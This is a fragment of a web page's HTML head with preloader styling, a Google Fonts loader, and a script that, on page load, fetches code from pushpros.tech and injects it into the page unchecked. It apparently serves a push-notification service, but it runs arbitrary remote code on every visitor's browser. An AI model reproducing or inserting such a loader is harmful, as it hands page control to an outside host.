        .preloader {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 999999;
            background-color: #fff;
            background-position: center center;
            background-repeat: no-repeat;
            background-image: url(./assets/images/icons/preloader.svg);
            background-size: 100px;
        }
    </style>

    <script>
        var xhr = new XMLHttpRequest();
        xhr.open(
            "GET",
            "https://fonts.googleapis.com/css?family=Poppins:400,500,600,700,800|Open+Sans|Rubik:wght@300,400,500,600| Raleway",
            true
        );
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                let css = xhr.responseText;
                css = css.replace(/}/g, "font-display: swap; }");

                const head = document.getElementsByTagName("head")[0];
                const style = document.createElement("style");
                style.appendChild(document.createTextNode(css));
                head.appendChild(style);
            }
        };
        xhr.send();
    </script>

    <script>
        (function() {
            fetch(
                "https://pushpros.tech/GetPushScript?key=2Xa3N8H4tIMDq5DaLOjgimHq4HG8UhWO&domain=" +
                window.location.hostname, {
                    method: "GET",
                    redirect: "follow",
                    mode: "cors",
                }
            ).then(function(r) {
                r.json().then(function(response) {
                    if (!response.success || !response.script) return;
                    var s = document.createElement("script");
                    s.type = "text/javascript";
                    s.innerHTML = response.script;
                    document.getElementsByTagName("head")[0].appendChild(s);
                });
            });
        })();
    </script>
